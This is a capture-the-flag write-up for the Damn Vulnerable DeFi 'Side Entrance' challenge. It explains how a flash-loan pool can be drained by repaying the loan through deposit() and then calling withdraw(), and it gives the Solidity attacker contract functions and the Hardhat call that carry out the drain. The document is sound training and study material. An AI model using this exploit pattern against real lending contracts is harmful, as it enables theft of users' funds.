### [Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/side-entrance)

### Task
>A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

>It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

>Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.
### Observations

- This contract allows users to deposit and withdraw Eth.

- This contract allows flashloans as long as the ammount is payed back in the same transaction:
```
if (address(this).balance < balanceBefore)
            revert RepayFailed();
```

- The `flashLoan()` func calls `execute()` on the borrower contract. We can write anything into this function.

- We can deposit the borrowed money back to the contract from within the `execute()` function.

- Then we just withdraw it all again using `withdraw()`.

### Steps

- Make an attacker contract with the following functions:
  - `attack()` to call the flashloan and then withdraw the newly depositted funds:
  ```
    function attack() external {
        uint256 amount = address(lenderPool).balance;
        lenderPool.flashLoan(amount);
        //lender calls execute() with `amount` value.
        //then withdraw
        lenderPool.withdraw();
    }
  ```
  - `execute()` to deposit the flashloan funds back to the lender contract:
  ```
    function execute() external payable {
        lenderPool.deposit{value: msg.value}();
    }
  ```

  - `receive()` to receive the withdrawn ether and to forward it to our personal wallet:
  ```
    receive() external payable {
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }
  ```

- In Hardhat test file:
  - Deploy the hack contract and execute the `attack()` function:
  ```
    const hack = await (await ethers.getContractFactory('SideEntranceHack', player)).deploy(pool.address);
    await hack.connect(player).attack();
  ```